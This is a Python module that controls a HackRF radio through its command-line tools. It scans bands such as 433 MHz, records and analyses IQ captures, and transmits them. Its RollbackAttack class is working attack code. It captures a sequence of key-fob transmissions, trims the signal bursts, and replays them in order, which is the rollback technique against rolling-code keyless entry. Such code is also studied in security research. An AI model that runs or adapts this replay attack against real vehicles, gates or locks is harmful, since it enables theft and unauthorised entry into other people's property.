"""
HackRF Controller — Spectrum scanning and IQ capture/replay
"""

import json
import os
import subprocess
import threading
import time

import numpy as np

from config import (
    HACKRF_LNA_GAIN, HACKRF_VGA_GAIN, HACKRF_SAMPLE_RATE,
    SCAN_BANDS, CAPTURES_DIR, SESSIONS_DIR,
)


class HackRFController:
    """HackRF control via CLI tools."""

    def __init__(self, on_event=None):
        self.on_event = on_event
        self.connected = False
        self.scanning = False
        self._scan_stop = threading.Event()
        self.last_peaks = []

        os.makedirs(CAPTURES_DIR, exist_ok=True)
        os.makedirs(SESSIONS_DIR, exist_ok=True)

    def _emit(self, event_type, data):
        if self.on_event:
            self.on_event(event_type, data)

    def check_connection(self):
        try:
            result = subprocess.run(
                ["hackrf_info"],
                capture_output=True, text=True, timeout=5,
            )
            self.connected = "Serial number" in result.stdout
            return self.connected
        except (FileNotFoundError, subprocess.TimeoutExpired):
            self.connected = False
            return False

    def scan_frequency(self, band="433", duration=10):
        """Sweep a frequency band and return detected peaks."""
        if band not in SCAN_BANDS:
            return {"error": f"Unknown band: {band}"}

        freq_min, freq_max = SCAN_BANDS[band]
        self.scanning = True
        self._scan_stop.clear()

        cmd = [
            "hackrf_sweep",
            "-f", f"{freq_min}:{freq_max}",
            "-l", str(HACKRF_LNA_GAIN),
            "-g", str(HACKRF_VGA_GAIN),
            "-w", "10000",
            "-1", "-n",
        ]

        peaks_found = {}
        sweep_count = 0
        start_time = time.time()

        self._emit("scan_started", {"band": band, "duration": duration})

        while not self._scan_stop.is_set() and (time.time() - start_time) < duration:
            try:
                result = subprocess.run(
                    cmd, capture_output=True, text=True,
                    timeout=10, check=False,
                )
            except subprocess.TimeoutExpired:
                continue
            except FileNotFoundError:
                self.scanning = False
                return {"error": "hackrf_sweep not found"}

            out = (result.stdout or "") + "\n" + (result.stderr or "")
            powers = []

            for line in out.splitlines():
                parts = [p.strip() for p in line.split(",")]
                if len(parts) < 7:
                    continue
                try:
                    hz_low = int(parts[2])
                    hz_bin = float(parts[4])
                    bins = [float(p) for p in parts[6:]]
                except (ValueError, IndexError):
                    continue

                for i, pwr in enumerate(bins):
                    f_mhz = hz_low / 1e6 + i * hz_bin / 1e6
                    if freq_min <= f_mhz <= freq_max:
                        powers.append((f_mhz, pwr))

            if not powers:
                continue

            sweep_count += 1
            all_pwr = [p for _, p in powers]
            noise = float(np.median(all_pwr))
            threshold = noise + 15

            for f_mhz, pwr in powers:
                if pwr > threshold:
                    bucket = round(f_mhz, 3)
                    snr = pwr - noise
                    if bucket not in peaks_found or peaks_found[bucket]["power_db"] < pwr:
                        peaks_found[bucket] = {
                            "freq_mhz": bucket,
                            "power_db": round(pwr, 1),
                            "snr_db": round(snr, 1),
                            "noise_db": round(noise, 1),
                        }

            if sweep_count % 3 == 0:
                progress = min(100, int((time.time() - start_time) / duration * 100))
                self._emit("scan_progress", {
                    "progress": progress,
                    "peaks": list(peaks_found.values())[:5],
                })

        self.scanning = False
        peaks = sorted(peaks_found.values(), key=lambda x: x["power_db"], reverse=True)
        self.last_peaks = peaks[:10]

        self._emit("scan_complete", {"peaks": self.last_peaks})
        return {"status": "ok", "peaks": self.last_peaks}

    def stop_scan(self):
        self._scan_stop.set()
        self.scanning = False
        return {"status": "ok"}

    def scan_frequency_sync(self, band="433", duration=10):
        """Synchronous frequency scan - returns results directly."""
        if band not in SCAN_BANDS:
            return {"status": "error", "error": f"Unknown band: {band}"}

        freq_min, freq_max = SCAN_BANDS[band]
        self.scanning = True
        self._scan_stop.clear()

        cmd = [
            "hackrf_sweep",
            "-f", f"{freq_min}:{freq_max}",
            "-l", str(HACKRF_LNA_GAIN),
            "-g", str(HACKRF_VGA_GAIN),
            "-w", "10000",
            "-1", "-n",
        ]

        peaks_found = {}
        start_time = time.time()

        while not self._scan_stop.is_set() and (time.time() - start_time) < duration:
            try:
                result = subprocess.run(
                    cmd, capture_output=True, text=True,
                    timeout=10, check=False,
                )
            except subprocess.TimeoutExpired:
                continue
            except FileNotFoundError:
                self.scanning = False
                return {"status": "error", "error": "hackrf_sweep not found"}

            out = (result.stdout or "") + "\n" + (result.stderr or "")

            for line in out.splitlines():
                parts = [p.strip() for p in line.split(",")]
                if len(parts) < 7:
                    continue
                try:
                    hz_low = int(parts[2])
                    hz_bin = float(parts[4])
                    bins = [float(p) for p in parts[6:]]
                except (ValueError, IndexError):
                    continue

                for i, pwr in enumerate(bins):
                    f_mhz = hz_low / 1e6 + i * hz_bin / 1e6
                    if freq_min <= f_mhz <= freq_max:
                        all_pwr = [float(p) for p in parts[6:]]
                        noise = float(np.median(all_pwr))
                        threshold = noise + 15
                        
                        if pwr > threshold:
                            bucket = round(f_mhz, 2)
                            snr = pwr - noise
                            if bucket not in peaks_found or peaks_found[bucket]["power_db"] < pwr:
                                peaks_found[bucket] = {
                                    "freq_mhz": bucket,
                                    "power_db": round(pwr, 1),
                                    "snr_db": round(snr, 1),
                                }

        self.scanning = False
        peaks = sorted(peaks_found.values(), key=lambda x: x["power_db"], reverse=True)
        self.last_peaks = peaks[:10]

        return {"status": "ok", "peaks": self.last_peaks}

    def capture_signal(self, freq_mhz, duration=5, session_name=None, lna_gain=None, vga_gain=None):
        """Capture raw IQ at specified frequency."""
        freq_hz = int(freq_mhz * 1e6)
        n_samples = HACKRF_SAMPLE_RATE * duration
        rx_lna = HACKRF_LNA_GAIN if lna_gain is None else int(lna_gain)
        rx_vga = HACKRF_VGA_GAIN if vga_gain is None else int(vga_gain)

        if session_name is None:
            session_name = time.strftime("capture_%Y%m%d_%H%M%S")

        filename = os.path.join(CAPTURES_DIR, f"{session_name}_{freq_mhz}MHz.iq")

        cmd = [
            "hackrf_transfer",
            "-r", filename,
            "-f", str(freq_hz),
            "-s", str(HACKRF_SAMPLE_RATE),
            "-l", str(rx_lna),
            "-g", str(rx_vga),
            "-n", str(n_samples),
        ]

        self._emit("capture_started", {"freq_mhz": freq_mhz, "duration": duration})

        try:
            subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=duration + 15, check=False,
            )
        except FileNotFoundError:
            return {"error": "hackrf_transfer not found"}
        except subprocess.TimeoutExpired:
            pass

        if not os.path.exists(filename):
            return {"error": "Capture failed"}

        size = os.path.getsize(filename)
        has_signal, info = self._analyze_capture(filename)

        result = {
            "status": "ok",
            "file": filename,
            "size_bytes": size,
            "has_signal": has_signal,
            "duration_ms": info.get("duration_ms", 0),
            "modulation": info.get("modulation", "unknown"),
        }

        self._emit("capture_complete", result)
        return result

    def _analyze_capture(self, filename):
        """Analyze captured IQ file for signal presence."""
        try:
            raw = np.fromfile(filename, dtype=np.int8, count=HACKRF_SAMPLE_RATE * 2 * 4)
            i_data = raw[0::2].astype(np.float32)
            q_data = raw[1::2].astype(np.float32)
            mag = np.sqrt(i_data**2 + q_data**2)

            dec = 100
            trim = len(mag) // dec * dec
            mag_d = mag[:trim].reshape(-1, dec).mean(axis=1)

            noise = float(np.percentile(mag_d, 20))
            peak = float(np.percentile(mag_d, 99))

            if peak / (noise + 1e-10) < 2.5:
                return False, {}

            thresh = noise + (peak - noise) * 0.3
            above = mag_d > thresh
            indices = np.where(above)[0]

            if len(indices) < 10:
                return False, {}

            eff_rate = HACKRF_SAMPLE_RATE / dec
            duration_ms = (indices[-1] - indices[0]) / eff_rate * 1000

            p10 = float(np.percentile(mag_d, 10))
            p90 = float(np.percentile(mag_d, 90))
            amp_ratio = p90 / (p10 + 1e-10)
            modulation = "OOK" if amp_ratio > 3.0 else "FSK"

            return True, {"duration_ms": duration_ms, "modulation": modulation}
        except Exception:
            return False, {}

    def transmit_iq(self, filename, freq_mhz, tx_gain=47):
        """Transmit IQ file."""
        if not os.path.exists(filename):
            return {"error": f"File not found: {filename}"}

        freq_hz = int(freq_mhz * 1e6)

        cmd = [
            "hackrf_transfer",
            "-t", filename,
            "-f", str(freq_hz),
            "-s", str(HACKRF_SAMPLE_RATE),
            "-a", "1",
            "-x", str(tx_gain),
        ]

        self._emit("transmit_started", {"file": filename, "freq_mhz": freq_mhz})

        try:
            result = subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=30, check=False,
            )
            success = result.returncode == 0
        except FileNotFoundError:
            return {"error": "hackrf_transfer not found"}
        except subprocess.TimeoutExpired:
            success = True

        self._emit("transmit_complete", {"success": success})
        return {"status": "ok" if success else "error"}

    def list_captures(self):
        """List all captured files."""
        captures = []
        if os.path.exists(CAPTURES_DIR):
            for f in sorted(os.listdir(CAPTURES_DIR)):
                if f.endswith(".iq") or f.endswith(".rawdata"):
                    path = os.path.join(CAPTURES_DIR, f)
                    captures.append({
                        "name": f,
                        "path": path,
                        "size_bytes": os.path.getsize(path),
                        "created": time.ctime(os.path.getctime(path)),
                    })
        return {"captures": captures}


class RollbackAttack:
    """HackRF-based rollback attack (passive capture + sequential replay)."""

    def __init__(self, hackrf: HackRFController, on_event=None):
        self.hackrf = hackrf
        self.on_event = on_event
        self.current_session = None
        self.signals = []

    def _emit(self, event_type, data):
        if self.on_event:
            self.on_event(event_type, data)

    def start_session(self, freq_mhz, count=3):
        """Create a new rollback capture session."""
        ts = time.strftime("%Y%m%d_%H%M%S")
        session_dir = os.path.join(SESSIONS_DIR, f"rollback_{ts}")
        os.makedirs(session_dir, exist_ok=True)

        self.current_session = {
            "dir": session_dir,
            "freq_mhz": freq_mhz,
            "count": count,
            "signals": [],
            "created": ts,
        }
        self.signals = []

        return {"status": "ok", "session": session_dir}

    def capture_signal(self, signal_index, duration=4):
        """Capture one signal in the rollback sequence."""
        if not self.current_session:
            return {"error": "No active session"}

        freq_mhz = self.current_session["freq_mhz"]
        session_dir = self.current_session["dir"]

        filename = os.path.join(session_dir, f"signal_{signal_index:03d}.iq")
        freq_hz = int(freq_mhz * 1e6)
        n_samples = HACKRF_SAMPLE_RATE * duration

        cmd = [
            "hackrf_transfer",
            "-r", filename,
            "-f", str(freq_hz),
            "-s", str(HACKRF_SAMPLE_RATE),
            "-l", str(HACKRF_LNA_GAIN),
            "-g", str(HACKRF_VGA_GAIN),
            "-n", str(n_samples),
        ]

        self._emit("rollback_capture_started", {
            "index": signal_index,
            "total": self.current_session["count"],
        })

        try:
            subprocess.run(
                cmd, capture_output=True, text=True,
                timeout=duration + 10, check=False,
            )
        except FileNotFoundError:
            return {"error": "hackrf_transfer not found"}
        except subprocess.TimeoutExpired:
            pass

        if not os.path.exists(filename):
            return {"error": f"Capture {signal_index} failed"}

        has_signal, info = self.hackrf._analyze_capture(filename)

        sig_info = {
            "index": signal_index,
            "file": f"signal_{signal_index:03d}.iq",
            "has_signal": has_signal,
            "duration_ms": info.get("duration_ms", 0),
            "timestamp": time.time(),
        }

        self.current_session["signals"].append(sig_info)
        self.signals.append(sig_info)

        self._save_metadata()

        self._emit("rollback_capture_complete", sig_info)

        return {"status": "ok", "signal": sig_info}

    def _save_metadata(self):
        if not self.current_session:
            return
        meta_path = os.path.join(self.current_session["dir"], "metadata.json")
        with open(meta_path, "w") as f:
            json.dump({
                "attack": "rollback",
                "frequency_mhz": self.current_session["freq_mhz"],
                "sample_rate": HACKRF_SAMPLE_RATE,
                "signals": self.current_session["signals"],
                "created": self.current_session["created"],
            }, f, indent=2)

    def replay_sequence(self, session_dir=None, delay=0.3, tx_gain=47):
        """Replay all signals in order, using trimmed signal bursts for speed."""
        if session_dir is None:
            if not self.current_session:
                return {"error": "No active session"}
            session_dir = self.current_session["dir"]

        meta_path = os.path.join(session_dir, "metadata.json")
        if not os.path.exists(meta_path):
            return {"error": "Session metadata not found"}

        with open(meta_path) as f:
            metadata = json.load(f)

        freq_mhz = metadata["frequency_mhz"]
        signals = metadata["signals"]

        for i, sig in enumerate(signals):
            iq_path = os.path.join(session_dir, sig["file"])
            if not os.path.exists(iq_path):
                continue

            # Use trimmed version if available, otherwise create it
            trimmed_path = iq_path.replace(".iq", "_trimmed.iq")
            if not os.path.exists(trimmed_path):
                trimmed_path = self._extract_signal_burst(iq_path, trimmed_path)
            
            if trimmed_path and os.path.exists(trimmed_path):
                self.hackrf.transmit_iq(trimmed_path, freq_mhz, tx_gain)
            else:
                self.hackrf.transmit_iq(iq_path, freq_mhz, tx_gain)

            if i < len(signals) - 1:
                time.sleep(delay)

        return {"status": "ok", "signals_sent": len(signals)}

    def _extract_signal_burst(self, iq_path, output_path):
        """Extract just the signal burst from an IQ file."""
        try:
            raw = np.fromfile(iq_path, dtype=np.int8)
            print(f"[TRIM] Input file: {len(raw)} bytes")
            if len(raw) < 1000:
                return None
            
            # Calculate magnitude (I and Q are interleaved)
            i_data = raw[0::2].astype(np.float32)
            q_data = raw[1::2].astype(np.float32)
            mag = np.sqrt(i_data**2 + q_data**2)
            
            # Downsample for faster processing
            block_size = 1000
            n_blocks = len(mag) // block_size
            if n_blocks < 10:
                return None
            
            mag_blocks = mag[:n_blocks * block_size].reshape(-1, block_size).mean(axis=1)
            
            # Find threshold (noise floor + margin)
            noise_floor = np.percentile(mag_blocks, 30)
            peak_level = np.percentile(mag_blocks, 99)
            threshold = noise_floor + (peak_level - noise_floor) * 0.4
            
            print(f"[TRIM] Noise: {noise_floor:.1f}, Peak: {peak_level:.1f}, Threshold: {threshold:.1f}")
            
            # Find signal region
            above_thresh = mag_blocks > threshold
            if not np.any(above_thresh):
                print("[TRIM] No signal above threshold")
                return None
            
            indices = np.where(above_thresh)[0]
            start_block = max(0, indices[0] - 10)
            end_block = min(len(mag_blocks), indices[-1] + 10)
            
            print(f"[TRIM] Signal blocks: {indices[0]} to {indices[-1]} ({len(indices)} blocks)")
            
            # Convert back to sample indices (multiply by 2 for I/Q pairs)
            start_sample = start_block * block_size * 2
            end_sample = end_block * block_size * 2
            
            # Ensure minimum 200ms of signal (800k bytes at 2MHz)
            min_bytes = 800000
            if (end_sample - start_sample) < min_bytes:
                center = (start_sample + end_sample) // 2
                start_sample = max(0, center - min_bytes // 2)
                end_sample = min(len(raw), center + min_bytes // 2)
            
            # Extract and save trimmed signal
            trimmed = raw[start_sample:end_sample]
            trimmed.tofile(output_path)
            
            print(f"[TRIM] Output file: {len(trimmed)} bytes ({len(trimmed)/1e6:.2f} MB)")
            return output_path
        except Exception as e:
            print(f"[TRIM] Error: {e}")
            return None

    def list_sessions(self):
        """List all rollback sessions."""
        sessions = []
        if os.path.exists(SESSIONS_DIR):
            for d in sorted(os.listdir(SESSIONS_DIR), reverse=True):
                path = os.path.join(SESSIONS_DIR, d)
                if not os.path.isdir(path):
                    continue
                meta_path = os.path.join(path, "metadata.json")
                if os.path.exists(meta_path):
                    with open(meta_path) as f:
                        meta = json.load(f)
                    sessions.append({
                        "name": d,
                        "path": path,
                        "freq_mhz": meta.get("frequency_mhz"),
                        "signal_count": len(meta.get("signals", [])),
                        "created": meta.get("created"),
                    })
        return {"sessions": sessions}

    def rename_session(self, session_dir, new_name):
        """Rename a session folder."""
        if not session_dir or not os.path.exists(session_dir):
            return {"status": "error", "error": "Session not found"}
        
        if not new_name:
            return {"status": "error", "error": "Name required"}
        
        # Sanitize name
        safe_name = "".join(c if c.isalnum() or c in "-_" else "_" for c in new_name)
        new_path = os.path.join(SESSIONS_DIR, safe_name)
        
        # Don't overwrite existing
        if os.path.exists(new_path):
            return {"status": "error", "error": "Name already exists"}
        
        try:
            os.rename(session_dir, new_path)
            
            # Update current session reference if it matches
            if self.current_session and self.current_session.get("dir") == session_dir:
                self.current_session["dir"] = new_path
            
            return {"status": "ok", "new_path": new_path}
        except OSError as e:
            return {"status": "error", "error": str(e)}
